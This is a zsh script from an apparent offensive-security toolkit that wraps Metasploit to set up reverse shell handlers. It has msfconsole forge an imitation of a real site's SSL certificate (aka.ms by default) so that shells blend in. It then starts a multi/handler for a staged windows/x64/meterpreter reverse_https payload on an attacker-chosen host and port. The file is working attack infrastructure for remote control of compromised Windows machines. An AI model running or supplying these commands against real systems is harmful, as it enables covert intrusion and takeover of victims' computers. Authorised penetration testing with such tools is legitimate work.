#!/usr/bin/env zsh

############################################################# 
# qq-shell-handlers-msf
#############################################################

qq-shell-handlers-msf-help() {
    cat << "DOC"

qq-shell-handlers-msf
---------------------
The shell-handlers-msf namespace provides commands for spawning 
reverse shell connections using metasploit.

Commands
--------
qq-shell-handlers-msf-install:            installs dependencies
qq-shell-handlers-msf-ssl-gen:            impersonate a real SSL certificate for use in reverse shells
qq-shell-handlers-msf-w64-multi-https:    multi-handler for staged windows/x64/meterpreter/reverse_https payload

DOC
}

qq-shell-handlers-install-msf() {
    __info "Running $0..."
    __pkgs metasploit-framework
}

qq-shell-handlers-msf-ssl-gen() {
    __ask "Enter the hostname of the site to impersonate"
    local r && __prefill r SITE aka.ms
    local cmd="use auxiliary/gather/impersonate_ssl; set RHOST ${r}; run; exit "
    __info "Use qq-vars-global-set-ssl-shell-cert to the path of the .pem file"
    print -z "msfconsole -n -q -x \"${cmd}\" "
}

qq-shell-handlers-msf-w64-https() {
    qq-vars-set-lhost
    qq-vars-set-lport
    __msf << VAR
use exploit/multi/handler;
set PAYLOAD windows/x64/meterpreter/reverse_https;
set LHOST ${__LHOST};
set LPORT ${__LPORT};
set HANDLERSSLCERT ${__SHELL_SSL_CERT};
set EXITONSESSION false
run;
exit
VAR

}
